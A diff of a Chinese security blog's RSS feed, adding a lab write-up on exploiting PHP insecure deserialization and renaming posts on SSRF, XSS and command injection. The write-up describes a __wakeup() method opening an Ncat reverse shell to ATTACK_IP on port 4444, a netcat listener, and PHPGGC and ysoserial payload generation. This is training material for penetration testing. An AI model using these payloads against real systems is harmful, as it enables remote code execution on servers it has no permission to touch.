+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Base64 Encoded Serialized Data: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$base64EncodedData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;在上面的代码中， &lt;code&gt;MaliciousUserData&lt;/code&gt; 类（ &lt;code&gt;test.php&lt;/code&gt; ）的 &lt;code&gt;_wakeup()&lt;/code&gt; 函数将使用 Ncat 执行反向 shell 命令，连接到指定的 IP 地址（ &lt;code&gt;ATTACK_IP&lt;/code&gt; ）和端口（ &lt;code&gt;4444&lt;/code&gt; ），并使用 -e 标志以 shell 形式执行 &lt;code&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;创建文件后，通过终端执行 &lt;code&gt;php index.php&lt;/code&gt; 。这将返回一个 base64 编码的 &lt;code&gt;MaliciousUserData&lt;/code&gt; 类序列化对象。&lt;/li&gt;
+&lt;li&gt;生成的 base64 编码字符串如下所示： &lt;code&gt;TzoxNzoiTWFsaWNp[Redacted]&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;使用 AttackBox 上的命令 &lt;code&gt;nc -nvlp 4444&lt;/code&gt; 启动端口 4444 上的 Netcat 监听器。&lt;/li&gt;
+&lt;li&gt;现在，是时候通过访问 URL &lt;code&gt;http://10.10.183.12/case2/?decode=[SHELLCODE]&lt;/code&gt; 来解码 shellcode 来利用不安全的反序列化，而无需生成 shellcode。&lt;/li&gt;
+&lt;li&gt;一旦访问该 URL，index.php 文件的反序列​​化函数就会对字符串进行反序列化并执行 &lt;code&gt;__wakeup()&lt;/code&gt; 函数，从而进入远程 shell。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424142828650.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424142828650&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;自动化脚本&#34;&gt;自动化脚本
+&lt;/h2&gt;&lt;p&gt;在渗透测试过程中，自动化脚本对于高效识别和利用 Web 应用程序中的漏洞至关重要。我们将探索一款名为 &lt;strong&gt;PHP Gadge Chain (PHPGGC)&lt;/strong&gt; 的工具，它在此过程中发挥着至关重要的作用，能够自动发现不安全的反序列化漏洞。PHPGGC 类似于 Java 生态系统中的 &lt;strong&gt;Ysoserial&lt;/strong&gt;，可帮助安全专业人员评估 PHP 应用程序的安全状况并降低潜在风险。&lt;/p&gt;
+&lt;h3 id=&#34;php-工具链-phpggc&#34;&gt;PHP 工具链 (PHPGGC)
+&lt;/h3&gt;&lt;p&gt;PHPGGC 主要是一个用于生成 PHP 对象注入攻击中使用的小工具链的工具，专门用于利用与 PHP 对象序列化和反序列化相关的漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;小工具链&lt;/strong&gt; ：PHPGGC 为各种 PHP 框架和库提供了一个小工具链库。这些小工具链是对象和方法的序列，旨在当 PHP 应用程序不安全地反序列化用户提供的数据时利用特定的漏洞。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;有效载荷生成&lt;/strong&gt; ：PHPGGC 的主要目的是促进生成可触发这些漏洞的序列化有效载荷。它帮助安全研究人员和渗透测试人员创建有效载荷，以展示不安全的反序列化漏洞的影响。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;有效载荷定制&lt;/strong&gt; ：用户可以通过为小工具链中涉及的函数或方法指定参数来定制有效载荷，从而定制攻击以实现特定结果，例如编码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;可以从 &lt;a class=&#34;link&#34; href=&#34;https://github.com/ambionics/phpggc&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;GitHub 仓库&lt;/a&gt;下载 PHPGGC，已安装的版本已包含一些小工具链、PHP 对象序列以及旨在利用反序列化漏洞的方法调用。这些小工具链利用 PHP 的魔术方法来实现各种攻击目标，例如远程代码执行。&lt;/p&gt;
+&lt;p&gt;要列出所有可用的小工具链，您可以使用 PHPGGC 的 &lt;code&gt;-l&lt;/code&gt; 选项，它将显示发起特定攻击的名称、版本、类型和向量。此外，您还可以根据小工具链的功能进行筛选，例如针对特定 PHP 框架或实现特定漏洞利用技术的链，方法是使用 &lt;code&gt;-l&lt;/code&gt; 选项后跟筛选关键字（例如 Drupal、Laravel 等）。这样您就可以根据自己的利用场景选择合适的小工具链，如下所示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yrc@machine$ php phpggc -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Gadget Chains
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;NAME                                      VERSION                                                 TYPE                      VECTOR          I    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bitrix/RCE1                               17.x.x &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 22.0.300                                      RCE: Command              __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CakePHP/RCE1                              ? &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 3.9.6                                              RCE: Command              __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CakePHP/RCE2                              ? &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 4.2.3                                              RCE: Command              __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CodeIgniter4/FD1                          &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 4.3.6                                                File delete               __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CodeIgniter4/FD2                          &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 4.3.7                                                File delete               __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CodeIgniter4/FR1                          4.0.0 &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 4.3.6                                          File &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt;                 __toString      *    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CodeIgniter4/RCE2                         4.0.0-rc.4 &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 4.3.6                                     RCE: Command              __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CodeIgniter4/RCE3                         4.0.4 &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 4.4.3                                          RCE: Command              __destruct           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CodeIgniter4/RCE4                         4.0.0-beta.1 &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 4.0.0-rc.4                              RCE: Command              __destruct        
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;例如， &lt;code&gt;CakePHP/RCE1&lt;/code&gt; 的输出表示名为 &lt;code&gt;CakePHP/RCE1&lt;/code&gt; 的小工具链利用了 CakePHP &lt;code&gt;3.9.6&lt;/code&gt; 及以上版本中的 RCE 漏洞 。该漏洞允许攻击者利用 &lt;code&gt;__destruct&lt;/code&gt; 魔术方法在服务器上执行任意命令。&lt;/p&gt;
+&lt;h3 id=&#34;java-版-ysoserial&#34;&gt;Java 版 Ysoserial
+&lt;/h3&gt;&lt;p&gt;Ysoserial 是一款广受认可的漏洞利用工具，专门用于测试 Java 应用程序的序列化漏洞。它有助于生成利用这些漏洞的有效载荷，使其成为攻击者和渗透测试人员评估和利用 Java 序列化应用程序的必备工具。&lt;/p&gt;
+&lt;p&gt;要使用 Ysoserial，攻击者通常会使用类似 &lt;code&gt;java -jar ysoserial.jar [payload type] &#39;[command to execute]&#39;&lt;/code&gt; 的命令生成有效载荷，其中 &lt;code&gt;[payload type]&lt;/code&gt; 表示漏洞利用类型， &lt;code&gt;[command to execute]&lt;/code&gt; 表示攻击者希望在目标系统上运行的任意命令。例如，使用 &lt;code&gt;CommonsCollections1&lt;/code&gt; 有效载荷类型可能如下所示： &lt;code&gt;java -jar ysoserial.jar CommonsCollections1 &#39;calc.exe&#39;&lt;/code&gt; 。此命令生成一个序列化对象，当被存在漏洞的应用程序反序列化时，该对象将执行指定的命令。Ysoserial 可在 GitHub 上&lt;a class=&#34;link&#34; href=&#34;https://github.com/frohoff/ysoserial&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;下载 &lt;/a&gt;。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Burpsuite利用宏爆破回显在响应包的验证码网页</title>
         <link>https://Yerucrem.github.io/p/burpsuite%E5%88%A9%E7%94%A8%E5%AE%8F%E7%88%86%E7%A0%B4%E5%9B%9E%E6%98%BE%E5%9C%A8%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BD%91%E9%A1%B5/</link>
         <pubDate>Tue, 15 Apr 2025 00:00:00 +0000</pubDate>
@@ -256,12 +830,12 @@
 </description>
         </item>
         <item>
-        <title>SSRF基础</title>
-        <link>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</link>
+        <title>SSRF-1</title>
+        <link>https://Yerucrem.github.io/p/ssrf-1/</link>
         <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</guid>
-        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png" alt="Featured image of post SSRF基础" /&gt;&lt;h1 id=&#34;ssrf基础&#34;&gt;SSRF基础
+        <guid>https://Yerucrem.github.io/p/ssrf-1/</guid>
+        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png" alt="Featured image of post SSRF-1" /&gt;&lt;h1 id=&#34;ssrf基础&#34;&gt;SSRF基础
 &lt;/h1&gt;&lt;h2 id=&#34;什么是ssrf&#34;&gt;什么是SSRF
 &lt;/h2&gt;&lt;p&gt;SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。&lt;/p&gt;
 &lt;h2 id=&#34;ssrf-的类型&#34;&gt;SSRF 的类型
@@ -742,12 +1316,12 @@
 </description>
         </item>
         <item>
-        <title>身份验证绕过</title>
-        <link>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</link>
+        <title>身份验证绕过-1</title>
+        <link>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-1/</link>
         <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</guid>
-        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png" alt="Featured image of post 身份验证绕过" /&gt;&lt;h1 id=&#34;身份验证绕过&#34;&gt;身份验证绕过
+        <guid>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-1/</guid>
+        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png" alt="Featured image of post 身份验证绕过-1" /&gt;&lt;h1 id=&#34;身份验证绕过&#34;&gt;身份验证绕过
 &lt;/h1&gt;&lt;h2 id=&#34;用户名枚举&#34;&gt;用户名枚举
 &lt;/h2&gt;&lt;h2 id=&#34;暴力&#34;&gt;暴力
 &lt;/h2&gt;&lt;h2 id=&#34;逻辑缺陷&#34;&gt;逻辑缺陷
@@ -1534,12 +2108,12 @@
 </description>
         </item>
         <item>
-        <title>关于XSS基础的利用</title>
-        <link>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</link>
+        <title>XSS-1</title>
+        <link>https://Yerucrem.github.io/p/xss-1/</link>
         <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</guid>
-        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png" alt="Featured image of post 关于XSS基础的利用" /&gt;&lt;h1 id=&#34;xss-thm-做题记录&#34;&gt;XSS THM 做题记录
+        <guid>https://Yerucrem.github.io/p/xss-1/</guid>
+        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png" alt="Featured image of post XSS-1" /&gt;&lt;h1 id=&#34;xss-thm-做题记录&#34;&gt;XSS THM 做题记录
 &lt;/h1&gt;&lt;h2 id=&#34;level-one&#34;&gt;Level One:
 &lt;/h2&gt;&lt;p&gt;看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318144957610.png&#34;
@@ -1702,12 +2276,12 @@
 &lt;/div&gt;</description>
         </item>
         <item>
-        <title>命令注入基础</title>
-        <link>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
+        <title>命令注入-1</title>
+        <link>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-1/</link>
         <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
-        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png" alt="Featured image of post 命令注入基础" /&gt;&lt;h1 id=&#34;命令注入&#34;&gt;命令注入
+        <guid>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-1/</guid>
+        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png" alt="Featured image of post 命令注入-1" /&gt;&lt;h1 id=&#34;命令注入&#34;&gt;命令注入
 &lt;/h1&gt;&lt;h2 id=&#34;分类&#34;&gt;分类
 &lt;/h2&gt;&lt;p&gt;命令注入主要可以通过以下两种方式之一进行检测：&lt;/p&gt;
 &lt;ol&gt;
